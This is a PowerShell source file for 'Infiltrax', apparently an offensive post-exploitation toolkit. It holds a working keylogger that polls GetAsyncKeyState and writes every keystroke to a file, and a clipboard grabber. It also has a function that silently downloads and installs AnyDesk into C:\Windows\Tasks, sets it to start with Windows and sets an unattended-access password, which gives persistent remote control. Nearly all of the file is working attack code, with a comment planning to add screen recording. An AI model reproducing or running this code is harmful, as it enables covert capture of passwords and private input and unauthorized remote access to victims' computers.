<#

Infiltrax File: Infiltrax.ps1
Author: Alex Dhital
License: MIT License
Required Dependencies: None

#>
 function Invoke-Clipboard {

<#
.SYNOPSIS

Simply gets the raw clipboard contents via Get-Clipboard powershell cmdlet hehe sry no sry

#>
    try {
        Get-Clipboard -Raw
    }
    catch {
    
        Write-Output "Error something went wrong"
    }
    
}

function Invoke-KeyStrokeCapture {
<#

.DESCRIPTION
Uses GetAsyncKeyState function from user32.dll to map key presses including special characters and appends them to specified file.

#>

    param(
        [Parameter(Mandatory = $true)][int]$DurationInSeconds,
        [Parameter(Mandatory = $true)][string]$OutputPath
    )

    $signatures = @"
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
"@
    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

    $null = New-Item -Path $OutputPath -ItemType File -Force

    $endTime = (Get-Date).AddSeconds($DurationInSeconds)

    $keyCodes = @{
        8 = "`b"        # backspace
        13 = "`r`n"     # enter
        32 = " "        # space
        9 = "`t"        # tab
        46 = "DEL"      # delete
    }

    $shiftKeyMapping = @{
        48 = ")" # for shift + 0
        49 = "!" # for shift + 1
        50 = "@" # for shift + 2
        51 = "#" # for shift + 3
        52 = "$" # for shift + 4
        53 = "%" # for shift + 5
        54 = "^" # for shift + 6
        55 = "&" # for shift + 7
        56 = "*" # for shift + 8
        57 = "(" # for shift + 9
    }

    $nonPrintableKeys = @{
        27 = "ESC" # escape
        33 = "PGUP" # page up
        34 = "PGDN" # page down
        35 = "END" # end
        36 = "HOME" # home
        37 = "LEFT" # left arrow
        38 = "UP" # up arrow
        39 = "RIGHT" # right arrow
        40 = "DOWN" # down arrow
    }

    $previousState = @{}
    $modifiers = @{
        16 = $false # left shift
        160 = $false # right shift
        17 = $false # ctrl
        18 = $false # alt
    }

    function Get-Character {
        param (
            [int]$keyCode
        )

        if ($modifiers[16] -or $modifiers[160]) {
            if ($shiftKeyMapping.ContainsKey($keyCode)) {
                return $shiftKeyMapping[$keyCode]
            }
        }

        if ($keyCode -ge 32 -and $keyCode -le 126) {
            return [char]$keyCode
        }

        if ($nonPrintableKeys.ContainsKey($keyCode)) {
            return $nonPrintableKeys[$keyCode]
        }

        return "" 
    }

    Write-Host -NoNewline "Capturing keystrokes: "

    while ((Get-Date) -lt $endTime) {
        Start-Sleep -Milliseconds 50

        for ($keyCode = 8; $keyCode -le 255; $keyCode++) {
            $keyState = $API::GetAsyncKeyState($keyCode)
            $isPressed = ($keyState -band 0x8000) -ne 0

            if ($keyCode -eq 16 -or $keyCode -eq 160) {
                $modifiers[$keyCode] = $isPressed
            } elseif ($keyCode -eq 17 -or $keyCode -eq 18) {
                $modifiers[$keyCode] = $isPressed
            } elseif ($isPressed -and (-not $previousState[$keyCode])) {
                $character = Get-Character -keyCode $keyCode
                [System.IO.File]::AppendAllText($OutputPath, $character, [System.Text.Encoding]::ASCII)

                # Append the keystroke to the same line in the console
                Write-Host -NoNewline $character

                $previousState[$keyCode] = $true
            } elseif (-not $isPressed) {
                if ($previousState.ContainsKey($keyCode)) {
                    $previousState.Remove($keyCode)
                }
            }
        }
    }

    Write-Host "`nKeystroke logging completed. Output saved to $OutputPath"
}

function Invoke-AnyDeskInstall {
    param (
        [Parameter(Mandatory = $true)]
        [string]$InstallPath,

        [Parameter(Mandatory = $true)]
        [string]$Password,

        [string]$AnyDeskURL = "https://download.anydesk.com/AnyDesk.exe",
        [string]$DestinationPath = "C:\Windows\Tasks\AnyDesk.exe"
    )

    function Test-AdminAccess {
        $currentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object System.Security.Principal.WindowsPrincipal($currentIdentity)
        return $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
    }

    function Download-And-Install-AnyDesk {

        New-Item -ItemType Directory -Path (Split-Path -Parent $DestinationPath) -Force -ErrorAction SilentlyContinue

        Write-Output "Downloading AnyDesk from $AnyDeskURL to $DestinationPath"
        Start-BitsTransfer -Source $AnyDeskURL -Destination $DestinationPath

        New-Item -ItemType Directory -Path $InstallPath -Force -ErrorAction SilentlyContinue

        try {
            Write-Output "Installing AnyDesk to $InstallPath"
            Start-Process -FilePath $DestinationPath -ArgumentList "--install `"$InstallPath`" --start-with-win --silent" -Wait
        } 
        catch {
            Write-Output "Error Occurred! Could not install AnyDesk to $InstallPath."
        }

        Start-Sleep -Seconds 5

        try {
            Remove-Item $DestinationPath -Force
        } catch {
            Write-Output "Failed to remove file: $_"
        }
    }

    function Find-AnyDeskPath {
        $possiblePaths = @(
            "C:\Program Files\AnyDesk\AnyDesk.exe",
            "C:\Program Files (x86)\AnyDesk\AnyDesk.exe",
            "$InstallPath\AnyDesk.exe"
        )

        foreach ($path in $possiblePaths) {
            if (Test-Path $path) {
                return $path
            }
        }

        return $null
    }

    function Setup-UnattendedAccess {
        $anyDeskPath = Find-AnyDeskPath
        if ($anyDeskPath) {
            Write-Output "Setting password..."
            Start-Process -FilePath $anyDeskPath -ArgumentList "--set-password $Password" -Wait

            $stdoutPath = "C:\Windows\Tasks\id.txt"
            Write-Output "Getting AnyDesk ID..."
            Start-Process -FilePath $anyDeskPath -ArgumentList "--get-id" -RedirectStandardOutput $stdoutPath -NoNewWindow -Wait
            
            if (Test-Path $stdoutPath) {
                $id = Get-Content $stdoutPath
                Write-Output "AnyDesk ID is: $id"
                Remove-Item $stdoutPath -ErrorAction SilentlyContinue
            } else {
                Write-Output "Failed to retrieve AnyDesk ID. Output file not found."
            }
        } else {
            Write-Output "AnyDesk executable not found. Unattended access setup aborted."
        }
    }

    function Check-AnyDeskInstallation {
        $anydesk = Get-Package -Name AnyDesk -ErrorAction SilentlyContinue
        if ($anydesk) {
            Write-Output "AnyDesk is already installed. Version: $($anydesk.Version)"
        } else {
            Write-Output "AnyDesk is not installed. Installing now..."
            Download-And-Install-AnyDesk
        }

        Setup-UnattendedAccess
    }

    if (-not (Test-AdminAccess)) {
        Write-Output "This function requires Administrative access."
        return
    }

    Check-AnyDeskInstallation
}

# To do: adding screen recording functionality probably? 










 


 
